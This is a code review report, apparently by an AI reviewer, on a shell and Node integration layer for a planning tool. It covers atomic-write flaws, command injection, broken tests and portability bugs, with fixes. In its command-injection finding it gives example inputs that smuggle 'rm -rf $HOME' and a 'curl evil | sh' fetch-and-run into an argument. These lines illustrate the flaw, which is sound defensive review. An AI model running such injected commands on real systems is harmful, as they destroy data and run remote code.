---
phase: 02-build-the-layer
reviewed: 2026-04-28T09:45:51Z
depth: standard
files_reviewed: 53
files_reviewed_list:
  - bin/gsd-sdk-shadow.mjs
  - bin/wrap-mutation.mjs
  - hooks/bd-sync.sh
  - hooks/block-gsd-sdk-mutation.sh
  - hooks/block-state-md.sh
  - hooks/worktree-post-checkout.sh
  - install.sh
  - install/memories/discovered-from.md
  - install/memories/dolt-push.md
  - install/memories/link-default.md
  - install/memories/state-paths.md
  - install/memories/todowrite.md
  - install/memories/type-strategy.md
  - install/memories/vocabulary.md
  - recipe/gsd-beads-recipe.md
  - scripts/cascade-loop.sh
  - scripts/regen-requirements.sh
  - scripts/regen-roadmap.sh
  - settings.fragment.json
  - tests/e2e/bd-ready.smoke.sh
  - tests/e2e/bd-sync-latency.test.sh
  - tests/e2e/concurrent-merge.test.sh
  - tests/e2e/fixtures/scale-50-bead.sh
  - tests/e2e/full-install.smoke.sh
  - tests/e2e/post-gsd-update.smoke.sh
  - tests/fixtures/bd-helpers/3-level-hierarchy.sh
  - tests/hook-tests/bd-sync.test.sh
  - tests/hook-tests/block-gsd-sdk-mutation.test.sh
  - tests/hook-tests/block-state-md.test.sh
  - tests/hook-tests/cascade-loop.test.sh
  - tests/hook-tests/regen-requirements.test.sh
  - tests/hook-tests/regen-roadmap.test.sh
  - tests/install-tests/idempotency.test.sh
  - tests/install-tests/memory-seeding.test.sh
  - tests/install-tests/no-gsd-core-mutation.test.sh
  - tests/install-tests/path-precedence.test.sh
  - tests/install-tests/settings-merge.test.sh
  - tests/run-all.sh
  - tests/run-quick.sh
  - tests/shadow-tests/argv-routing.test.mjs
  - tests/shadow-tests/handler-milestone-complete.test.mjs
  - tests/shadow-tests/handler-phase-add-batch.test.mjs
  - tests/shadow-tests/handler-phase-add.test.mjs
  - tests/shadow-tests/handler-phase-complete.test.mjs
  - tests/shadow-tests/handler-phase-insert.test.mjs
  - tests/shadow-tests/handler-phase-remove.test.mjs
  - tests/shadow-tests/handler-phase-scaffold.test.mjs
  - tests/shadow-tests/handler-phases-archive.test.mjs
  - tests/shadow-tests/handler-phases-clear.test.mjs
  - tests/shadow-tests/handler-requirements-mark-complete.test.mjs
  - tests/shadow-tests/handler-roadmap-annotate-dependencies.test.mjs
  - tests/shadow-tests/handler-roadmap-update-plan-progress.test.mjs
  - tests/shadow-tests/handler-todo-complete.test.mjs
  - tests/shadow-tests/wrap-mutation.test.mjs
  - tests/worktree-tests/append-idempotency.test.sh
  - tests/worktree-tests/auto-config.test.sh
findings:
  critical: 4
  warning: 11
  info: 9
  total: 24
status: issues_found
---

# Phase 02: Code Review Report

**Reviewed:** 2026-04-28T09:45:51Z
**Depth:** standard
**Files Reviewed:** 53
**Status:** issues_found

## Summary

Phase 2 ships a coherent, well-tested integration layer. The hook scripts
look battle-tested (parity with Spike 001/012 test suites), the shadow
binary architecture closely mirrors the canonical Y1 design, and the test
matrix is unusually thorough (43-case mutation blocker, 30-case path
denier, per-handler shadow tests).

That said, four BLOCKER-level defects defeat important guarantees the
code explicitly claims:

1. The "atomic mktemp+mv" pattern relied on by `install.sh`,
   `regen-roadmap.sh`, and `regen-requirements.sh` is **not** atomic
   when `/tmp` and the destination are on different filesystems
   (typical on WSL2 with a tmpfs `/tmp`, common on macOS) — `mv` falls
   back to copy+unlink and a crash mid-write leaves a partial or
   corrupt file. T-02-06 / T-02-07 mitigations are silently nullified.
2. Several shadow handlers in `bin/gsd-sdk-shadow.mjs` interpolate
   user-controlled args directly into `execSync` shell command strings
   without quoting (`bd close ${phaseId}`, `bd label add ${beadId} ...`,
   `bd link ${taskId} ${phaseId} ...`). A title or ID containing shell
   metacharacters is a command-injection vector.
3. `tests/install-tests/path-precedence.test.sh` CASE 2b asserts on
   `$?` after a command followed by `|| true`, so the exit code is
   always 0 — the assertion is structurally incapable of failing.
4. `regen-requirements.sh` uses GNU-only `sed 's/^./\U&/'` for
   category-header capitalization. macOS BSD `sed` does not support
   `\U` — the script will produce a literal backslash-U on macOS,
   which is one of the supported platforms per CLAUDE.md.

The Warnings cover real but lower-impact correctness problems
(debounce window using only ROADMAP mtime, `head -1` silently dropping
duplicate `req-id:` labels, `closed=$(... | head -1)` interacting with
`set -e`/pipefail), and several test-suite quality issues that mask
real regressions.

## Critical Issues

### CR-01: mktemp+mv is not atomic across filesystems — defeats T-02-06 / T-02-07

**Files:**
- `install.sh:99-103`
- `scripts/regen-roadmap.sh:28, 237`
- `scripts/regen-requirements.sh:28, 269`

**Issue:**
All three scripts comment-claim atomicity ("T-02-06 mitigation: atomic
mktemp+mv only", "T-02-07 mitigation"), but call `mktemp` with no
`-p` / `--tmpdir` argument. `mktemp` then puts the temp file in
`/tmp` (or `$TMPDIR`). On WSL2 (a supported platform per CLAUDE.md)
`/tmp` is commonly a tmpfs, and on macOS `/tmp` is `/private/tmp` —
distinct filesystems from a user repo under `~/code/...` or
`$HOME/.beads/`.

`mv` between filesystems is **copy + unlink**, not a rename(2). If
the process is killed (or the disk fills) during the copy, the
destination is left half-written or empty, exactly the corruption
mode T-02-06 was supposed to prevent.

In `install.sh:99` this affects `.beads/hooks/post-checkout` (a
git-tracked file shared between worktrees). In the regen scripts it
affects `.planning/ROADMAP.md` and `.planning/REQUIREMENTS.md`,
which the Edit/Write blocker won't let an agent recover by hand.

**Fix:**
Allocate the tempfile on the **same filesystem as the destination**
so `mv` becomes a rename(2):

```bash
# install.sh step 6
tmp_pc="$(mktemp "$(dirname "$target")/post-checkout.XXXXXX")"

# regen-roadmap.sh / regen-requirements.sh
tmp=$(mktemp "$root/.planning/.regen.XXXXXX")
trap 'rm -f "$tmp"' EXIT
```

### CR-02: Command injection via execSync string interpolation in shadow handlers

**File:** `bin/gsd-sdk-shadow.mjs:33, 52, 69, 70, 78, 86, 107, 110, 114, 131, 145, 156, 166, 175, 184, 197, 198`

**Issue:**
Several handlers feed user-controlled input directly into a `execSync`
**string** (which is parsed by `/bin/sh`), without per-arg quoting.
Examples:

```js
// line 33  — beadId is the output of `bd q <title>`; user controls title
execSync(`bd label add ${beadId} gsd:phase`, { cwd: projectDir });

// line 78  — phaseId is args[0] (user input)
execSync(`bd close ${phaseId}`, { cwd: projectDir });

// line 86 — same
execSync(`bd close ${phaseId} --reason removed`, { cwd: projectDir });

// line 114 — taskId and phaseId both end up in the shell command line
execSync(`bd link ${taskId} ${phaseId} --type parent-child`, ...);

// line 156 — planId is args[0] (user input); JSON.stringify(status) protects status only
execSync(`bd update ${planId} --status ${JSON.stringify(status)}`, ...);

// line 166 — both phaseId and depId from user
execSync(`bd link ${phaseId} ${depId} --type blocks`, ...);

// line 197/198 — milestoneId from user; bd label is invoked unquoted
execSync(`bd label remove ${milestoneId} active`, ...);
execSync(`bd label add ${milestoneId} completed`, ...);
```

Hooks block direct `Edit/Write` to state files but allow
`gsd-sdk query phase.complete '<id>; rm -rf $HOME'` — the dispatch
hook's command pattern matches, so blocking depends on the deny-list,
which is ID/title-blind. A bead ID returned by `bd q` is reasonably
constrained, but `args[0]` (phase id, plan id, dep id) comes
straight from the agent / user payload.

The threat surface is a malicious or buggy invocation reaching
`gsd-sdk query phase.complete "abc; curl evil | sh"`. Bash splits
on the embedded `;` and runs the second command in the project dir.

The other titled handlers (`phase.add`, `phase.add-batch`,
`phase.scaffold`, `phase.insert`) **do** use `JSON.stringify(title)`
to build a shell-safe quoted string, but only for the title — the
returned `beadId` then enters a label/link command unquoted. The
returned IDs are usually safe-looking, but this is defense-by-luck.

**Fix:**
Use the array form of `spawnSync` (no shell parse), or an exec
helper that quotes every interpolated token:

```js
import { spawnSync } from 'node:child_process';

function bd(args, projectDir) {
  const r = spawnSync('bd', args, { cwd: projectDir, encoding: 'utf-8' });
  if (r.status !== 0) throw new Error(`bd ${args.join(' ')} failed: ${r.stderr}`);
  return r.stdout.trim();
}

// Then:
const beadId = bd(['q', title, '-t', 'epic', '-p', '1'], projectDir);
bd(['label', 'add', beadId, 'gsd:phase'], projectDir);
bd(['close', phaseId], projectDir);
bd(['close', phaseId, '--reason', 'removed'], projectDir);
bd(['link', taskId, phaseId, '--type', 'parent-child'], projectDir);
bd(['update', planId, '--status', status], projectDir);
bd(['link', phaseId, depId, '--type', 'blocks'], projectDir);
bd(['label', 'remove', milestoneId, 'active'], projectDir);
bd(['label', 'add', milestoneId, 'completed'], projectDir);
```

This also removes the need for `JSON.stringify` quoting of titles, and
replaces silent `execSync` failures (which throw with no stderr by
default) with a clearer error message.

### CR-03: Test always passes — `$?` captured after `|| true` is always zero

**File:** `tests/install-tests/path-precedence.test.sh:57-59, 68-72`

**Issue:**

```bash
output2=$(PATH="..." bash "$REPO_ROOT/install.sh" 2>/dev/null || true)
exit_code2=$?
...
if [ "$exit_code2" = "0" ]; then
  _pass "CASE 2b: install.sh exits 0 (warn-not-abort) when shadow is shadowed"
else
  _fail "CASE 2b: expected exit 0, got exit $exit_code2"
fi
```

`$?` reflects the exit status of the **last** command — which is
`true`, because `|| true` was reached. `exit_code2` will always be
`0` regardless of whether `install.sh` aborted or warned. CASE 2b is
structurally incapable of catching the regression it is supposed to
catch.

**Fix:**

```bash
set +e
output2=$(PATH="..." bash "$REPO_ROOT/install.sh" 2>/dev/null)
exit_code2=$?
set -e
```

Or, more idiomatic:

```bash
if output2=$(PATH="..." bash "$REPO_ROOT/install.sh" 2>/dev/null); then
  exit_code2=0
else
  exit_code2=$?
fi
```

### CR-04: regen-requirements.sh uses GNU-only `\U` sed escape — broken on macOS

**File:** `scripts/regen-requirements.sh:105`

**Issue:**

```bash
cat_header=$(printf '%s' "$cat" | sed 's/^./\U&/; s/-/ /g' | awk ...)
```

`\U` (uppercase the matched substring) is a **GNU sed** extension. On
macOS / BSD `sed`, `\U` is interpreted literally — a category like
`auth` becomes `\Uauth` (i.e., a `## \Uauth` heading) rather than
`Auth`. CLAUDE.md lists macOS as a primary supported platform.

This breaks the format contract enforced by Spike 007 (REQUIREMENTS
must group with `### <Category>` headers). The follow-on `awk`
pipeline does word-by-word capitalization that would have been
sufficient on its own.

**Fix:** Drop the `sed` call and rely on `awk`, which is portable:

```bash
cat_header=$(printf '%s' "$cat" \
  | tr '-' ' ' \
  | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) tolower(substr($i,2)); print}')
```

## Warnings

### WR-01: Filter callback uses original argv for `--project-dir` skip — works but fragile

**File:** `bin/gsd-sdk-shadow.mjs:282-286`

**Issue:** The filter relies on `arr` being the original (pre-filter)
array. That's correct per the spec, but the comment ("strip
`--project-dir <value>`") doesn't mention it, and a subtle refactor
to `for...of` would silently drop the wrong argument. Comment why the
zero-based index over the *original* array works.

**Fix:** Add a comment, or replace with a one-liner that uses `argv`
directly:

```js
const queryArgv = [];
const after = argv.slice(queryIdx + 1);
for (let i = 0; i < after.length; i++) {
  if (after[i] === '--project-dir') { i++; continue; }
  queryArgv.push(after[i]);
}
```

### WR-02: bd-sync.sh debounce keys off ROADMAP.md mtime only

**File:** `hooks/bd-sync.sh:28-32`

**Issue:** Debounce checks `ROADMAP.md` mtime with a 1-second window,
then skips both regen scripts. If `bd close <task>` triggers two
rapid PostToolUse hooks (one for the close, one for any chained bd
call), the second is skipped — but it might be the one that needs to
run because cascade-loop closed a parent. State drift is bounded
(next bd command repairs it) but visible to agents that just ran a
state-changing command and immediately read the markdown.

Also: `regen-requirements.sh` only writes `REQUIREMENTS.md`, but the
debounce flag is on `ROADMAP.md`. If REQUIREMENTS regen fails but
ROADMAP succeeds, the next call still skips both because ROADMAP's
mtime is fresh.

**Fix:** Either drop the debounce (cascade is idempotent and the bd
calls are <300ms each at the 50-bead scale per `bd-sync-latency`),
or use a separate sentinel that the regen scripts both touch on
success:

```bash
sentinel="${CLAUDE_PROJECT_DIR:-$PWD}/.planning/.bd-sync-stamp"
[ -f "$sentinel" ] && [ "$(($(date +%s) - $(stat -c %Y "$sentinel")))" -lt 1 ] && exit 0
...
touch "$sentinel"
```

### WR-03: cascade-loop.sh `closed=$(... | head -1)` interacts with set -e + pipefail

**File:** `scripts/cascade-loop.sh:18, 36`

**Issue:** `set -euo pipefail` is on. Line 36:

```bash
closed=$(echo "$out" | sed -n 's/^✓ Closed \([0-9]\+\) epic.*$/\1/p' | head -1)
```

`head -1` exits as soon as it has its line, which can SIGPIPE the
upstream `sed`. With `pipefail`, the pipeline returns non-zero. In
bash 4.4+ with `set -e` inheriting into command substitution
(`shopt -s inherit_errexit`), the substitution would abort the
script. This script does not enable `inherit_errexit` so it survives
today, but the test (`cascade-loop.test.sh`) covers only the empty
output / fixture-based paths and would not catch a regression in a
future bash that flips this default.

**Fix:** Drop `head -1` (sed already emits at most one line per
match — and if there are multiple, the test should detect that as a
parse error rather than silently keep the first):

```bash
closed=$(echo "$out" | sed -n 's/^✓ Closed \([0-9]\+\) epic.*$/\1/p' | head -n1 || true)
```

Or replace the pipeline with a single awk. Either way, document the
choice.

### WR-04: regen-requirements.sh silently drops duplicate req-id labels

**File:** `scripts/regen-requirements.sh:117, 138, 161, 193, 247`

**Issue:** Five separate sites do:

```bash
req_id=$(... | jq -r '.labels[] | select(startswith("req-id:")) | ltrimstr("req-id:")' | head -1)
```

If a bead has two `req-id:` labels (e.g., from a typo or merge), the
second is silently discarded and traceability is wrong. Worse, this
is undetectable at runtime — the regen output looks plausible.

**Fix:** Either fail loudly when more than one is present (preferred,
since it's a data-integrity bug), or change the contract to "first
sorted":

```bash
req_id_count=$(... | jq -r '.labels[] | select(startswith("req-id:"))' | wc -l)
if [ "$req_id_count" -gt 1 ]; then
  echo "[regen-requirements] WARNING: bead has multiple req-id: labels" >&2
fi
```

### WR-05: regen-requirements.sh traceability extraction reads `.dependencies` blindly

**File:** `scripts/regen-requirements.sh:228-230`

**Issue:**

```bash
parent_req_ids=$(bd show "$phase_id" --json </dev/null | \
  jq -r '.[0].dependencies[] | select(.dependency_type=="parent-child") | .labels[] | ...' \
  ...)
```

`bd show <phase>` returns dependencies in BOTH directions (parents
**and** children) in a single `dependencies` array. Filtering by
`.dependency_type=="parent-child"` does not by itself disambiguate
"this phase's parents" from "this phase's children" — both have type
`parent-child`. If the phase has child tasks with `req-id:` labels
on those child tasks (today none do, but the contract doesn't forbid
it), the trace table will list those children as "the requirement
this phase satisfies."

**Fix:** Filter additionally by direction. `bd show` typically
includes a `direction` or `from`/`to` field — confirm the schema and
add the filter:

```bash
jq -r --arg id "$phase_id" '
  .[0].dependencies[]
  | select(.dependency_type=="parent-child" and .from_id != $id)
  | .labels[] | ...
'
```

Schema details should be verified against current `bd show` output
before merging.

### WR-06: `set -uo pipefail` (no -e) in many tests masks failures

**Files:**
- `tests/run-all.sh:3`
- `tests/e2e/bd-ready.smoke.sh:5`
- `tests/e2e/bd-sync-latency.test.sh:4`
- `tests/e2e/concurrent-merge.test.sh:6`
- `tests/e2e/full-install.smoke.sh:5`
- `tests/e2e/post-gsd-update.smoke.sh:5`

**Issue:** Every E2E suite intentionally turns `-e` off so that a
failed CASE doesn't abort the whole test. But the per-CASE pattern
is `command || true; check $variable_from_command`. Several spots
swallow real failures:

- `concurrent-merge.test.sh:65-67`:
  ```bash
  final_json=$(bd show "$BEAD" --json 2>&1)
  final_status=$(echo "$final_json" | jq -r '.[0].status' 2>/dev/null || echo "")
  ```
  If `bd show` fails AND the status check just compares to "closed",
  the test reports the status as empty and "fails" — but it's because
  the fixture is broken, not the code. Distinguishing should be
  explicit.
- `bd-ready.smoke.sh:25` `out=$(bd ready 2>&1)` — combines stdout
  and stderr; passes if any output exists, including error text.

**Fix:** Per-CASE local trap, or per-block `set -e`:

```bash
case_run() {
  set -e
  ... assertions ...
  set +e
}
```

### WR-07: install.sh memory seeding doesn't trim trailing newline

**File:** `install.sh:84-88`

**Issue:**

```bash
for f in "$REPO"/install/memories/*.md; do
  key="gsd-beads:$(basename "$f" .md)"
  bd forget "$key" 2>/dev/null || true
  bd remember --key "$key" "$(cat "$f")"
done
```

Command substitution strips trailing newlines, so a file ending in
`\n\n` becomes `\n` (one trailing newline removed) before reaching
`bd remember`. Most memory files don't depend on this, but
`memory-seeding.test.sh` only checks for key presence, not content
exactness. If a memory's spec ever depends on its trailing-whitespace
shape, this breaks silently.

Bigger issue: `bd remember --key "$key" "$(cat "$f")"` passes the
entire body as a single shell argument. If a memory ever exceeds
`getconf ARG_MAX` (~2MB on Linux, ~256KB on macOS), `bd remember`
fails with E2BIG.

**Fix:** Use stdin if `bd remember` supports it, else fall back to
`xargs -0` or explicit length checks:

```bash
bd remember --key "$key" --from-file "$f"   # if bd supports it
# or
bd remember --key "$key" "$(< "$f")"         # avoids fork(cat) — same semantics
```

### WR-08: install.sh deep-merge clobbers non-(matcher,command,if) hook fields

**File:** `install.sh:54-58`

**Issue:** The dedup key is `"\(.command)\(.if // "")"`. After
`group_by(.matcher)`, a hook entry's `timeout`, `type`, or other
custom fields from the **first** hook in the group win (`(map(.[0]) ...`).
If an existing settings.json has the same matcher+command+if as our
fragment but a different timeout (e.g., 10s vs our 5s), the merge
silently overwrites the user's setting.

This is intentional ("first-wins") but undocumented. settings-merge
test CASE 4 asserts dedup count, not field preservation.

**Fix:** Document the precedence rule in install.sh and the
fragment-side comment, OR change the merge to prefer existing fields
on conflict:

```jq
unique_by("\(.command)\(.if // "")")
# becomes:
group_by("\(.command)\(.if // "")") | map(reduce .[] as $h ({}; . * $h))
```

### WR-09: regen-roadmap.sh and regen-requirements.sh — double-quoting failure on titles with special chars

**Files:**
- `scripts/regen-roadmap.sh:122-126, 188-192, 228`
- `scripts/regen-requirements.sh:124-127, 144-148, 167-172, 199`

**Issue:** Titles are emitted into Markdown via `printf '%s' "$r_title"`.
If a bead title contains a literal `|` (pipe), it breaks the
`## Progress` table parsing in `gsd-progress`. If it contains a `**`
it breaks the bold-emphasis. Spike 007 explicitly flagged
`gsd-progress` as a fragile parser — this is the place that fragility
becomes visible.

**Fix:** Either escape Markdown-special chars before emit:

```bash
md_escape() {
  printf '%s' "$1" | sed 's/|/\\|/g; s/\*/\\*/g'
}
```

…or document the constraint that bd titles must not contain `|*\`.
Add a test case with a deliberately ugly title.

### WR-10: tests/install-tests/path-precedence.test.sh leaks /tmp dirs on failure

**File:** `tests/install-tests/path-precedence.test.sh:31-89`

**Issue:** Three `sandbox*` directories are created with `mktemp -d`,
removed with `rm -rf "$sandbox*"` at the end of each CASE. There is
no `trap`, and `set -euo pipefail` is on — if any assertion fails or
any command exits non-zero before the `rm -rf`, the sandbox dirs are
left in `/tmp`.

The other tests already use `trap '...' EXIT`. This one is
inconsistent.

**Fix:**

```bash
sandboxes=()
trap 'rm -rf "${sandboxes[@]}"' EXIT
sandbox1=$(mktemp -d); sandboxes+=("$sandbox1")
... etc
```

### WR-11: tests/install-tests/idempotency.test.sh CASE 4 uses fragile pipe-with-fallback

**File:** `tests/install-tests/idempotency.test.sh:88, 92`

**Issue:**

```bash
count=$({ bd memories 2>/dev/null | grep -cF 'gsd-beads:'; } || echo 0)
```

`grep -c` outputs `0` AND exits 1 when there are no matches. `count`
captures the `0` from grep AND the `0` from `echo 0`, becoming the
two-line string `"0\n0"`. The subsequent comparison `[ "$count" = "7" ]`
fails (correctly — no false PASS), but it would also fail if there
were exactly 7 memories present and the grep exited 1 for any other
reason. The fallback never gives meaningful info.

**Fix:**

```bash
count=$(bd memories 2>/dev/null | grep -cF 'gsd-beads:' || true)
# grep -c always emits a count (even 0); || true just absorbs the
# exit status. Now $count is always a single number.
```

Same pattern at `memory-seeding.test.sh:39`.

## Info

### IN-01: bin/wrap-mutation.mjs uses top-level await for SDK_BASE import

**File:** `bin/wrap-mutation.mjs:11`

**Issue:** `const { GSDEventType } = await import(TYPES_PATH);` is a
top-level await in a module imported synchronously by
`gsd-sdk-shadow.mjs`. ESM supports it, but if `TYPES_PATH` is
unreachable (Volta uninstalled, GSD_SDK_PATH wrong), import fails
late and produces an unfriendly stack trace. Consider wrapping in a
try/catch with a one-line error:

```js
let GSDEventType;
try {
  ({ GSDEventType } = await import(TYPES_PATH));
} catch (err) {
  throw new Error(`gsd-beads: cannot load upstream SDK types from ${TYPES_PATH}. Set GSD_SDK_PATH or run \`volta install get-shit-done-cc\`. (${err.message})`);
}
```

### IN-02: gsd-sdk-shadow.mjs spawnUpstream calls process.exit but no return after

**File:** `bin/gsd-sdk-shadow.mjs:256, 262, 300`

**Issue:** Pattern is `if (cond) spawnUpstream(argv);` followed by
more code. `spawnUpstream` calls `process.exit`, so execution does
end — but a future refactor that changes `spawnUpstream` to merely
return a code would silently fall through. Make the contract
explicit:

```js
if (queryIdx === -1) return spawnUpstream(argv);
```

…or rename the function to indicate it terminates the process.

### IN-03: block-gsd-sdk-mutation.sh false-positive on benign substring

**File:** `hooks/block-gsd-sdk-mutation.sh:38`

**Issue:** Pattern `*"gsd-sdk "*"query "*` will match a quoted string
inside another command, e.g.,
`echo "use gsd-sdk query phase.add to add"`. The hook denies it
even though no shell parses it as a `gsd-sdk` invocation. Safe-side
(deny is correct), but the agent's confusion when its `echo` is
denied is a UX cost.

**Fix:** Anchor on word-boundary if possible, or just document the
known false positive in the test suite.

### IN-04: cascade-loop.sh "Cascade complete" message after MAX_ITER warning

**File:** `scripts/cascade-loop.sh:40-47`

**Issue:** When the loop hits `MAX_ITER`, the WARNING is printed,
then control falls through to the `total_closed > 0` block, which
also prints "Cascade complete: …". The user sees both messages —
"WARNING: hit max iteration cap" then "Cascade complete: 5 closed
across 19 iterations" — implying success. Either suppress the
"Cascade complete" line on cap-hit, or rephrase to "Cascade
truncated".

### IN-05: install.sh ls | wc -l for memory count

**File:** `install.sh:89`

**Issue:**

```bash
echo "seeded $(ls "$REPO"/install/memories/*.md | wc -l | tr -d ' ') bd memories under gsd-beads:*"
```

`ls | wc -l` is fragile (filenames with newlines, etc.). Better:
loop and count, OR use `find`:

```bash
echo "seeded $(printf '%s\n' "$REPO"/install/memories/*.md | wc -l) bd memories under gsd-beads:*"
```

### IN-06: install.sh Step 5 calls `bd remember` even when seeded value didn't change

**File:** `install.sh:84-88`

**Issue:** `bd forget "$key" && bd remember --key "$key" "$(cat "$f")"`
is run unconditionally on every install. On reinstall, this is a
write to bd's store even when content is unchanged. Not a bug, just
wasted work. A content hash check would be cleaner:

```bash
if [ "$(bd memories --json "$key" 2>/dev/null | jq -r '.value' )" != "$(< "$f")" ]; then
  bd forget "$key" 2>/dev/null || true
  bd remember --key "$key" "$(cat "$f")"
fi
```

### IN-07: hooks/worktree-post-checkout.sh `git config --worktree` fallback masks real errors

**File:** `hooks/worktree-post-checkout.sh:29-30`

**Issue:**

```bash
git config --worktree gsd-beads.dir "$source_beads" 2>/dev/null || \
  git config gsd-beads.dir "$source_beads"
```

If `--worktree` fails because `extensions.worktreeConfig` isn't
enabled, falling back to global-config silently writes the path into
the source repo's main `.git/config`, which then gets shared by
every worktree (instead of being per-worktree). The original Spike
003 design relied on per-worktree config. The fallback may produce
a working setup but defeats the cross-worktree-isolation property.

**Fix:** Detect missing extension and enable it explicitly:

```bash
if ! git config --worktree gsd-beads.dir "$source_beads" 2>/dev/null; then
  git config extensions.worktreeConfig true
  git config --worktree gsd-beads.dir "$source_beads"
fi
```

### IN-08: tests/shadow-tests use `result.stdout.trim()` regex without anchoring full input

**File:** `tests/shadow-tests/argv-routing.test.mjs:86`

**Issue:**

```js
assert.match(output, /^[a-zA-Z0-9_-]+-[a-zA-Z0-9]+$/, ...);
```

`result.stdout` may contain trailing newlines. The test calls
`.trim()` so this is OK today, but a future change to print metadata
on a second line (e.g., a timing diagnostic) would suddenly fail
with a confusing message. The regex documents what it wants but does
not document why. Add a comment:

```js
// bd IDs format: <prefix>-<base32>; the regex enforces the alphabet.
```

### IN-09: tests/run-all.sh continues on failure, masking aggregate red

**File:** `tests/run-all.sh:5-14`

**Issue:** `set -uo pipefail` (no -e) by design — but the loop counts
failures and prints "Suites failed: N" at the end. Two risks:

1. If `node --test "$suite"` is interrupted by SIGINT, the script
   continues to the next suite (no `trap`), so a Ctrl-C during a
   slow shadow test silently skips ahead.
2. The exit code is `[ "$fail" -eq 0 ]`. If `fail=0` AND zero suites
   ran (e.g., glob expanded to nothing on a fresh checkout because
   `tests/shadow-tests/*.test.mjs` aren't built yet), the script
   exits 0 — green for "I ran no tests." Not impactful today
   (suites are checked in) but worth a `[ -z "$ran_any" ]` guard.

---

_Reviewed: 2026-04-28T09:45:51Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
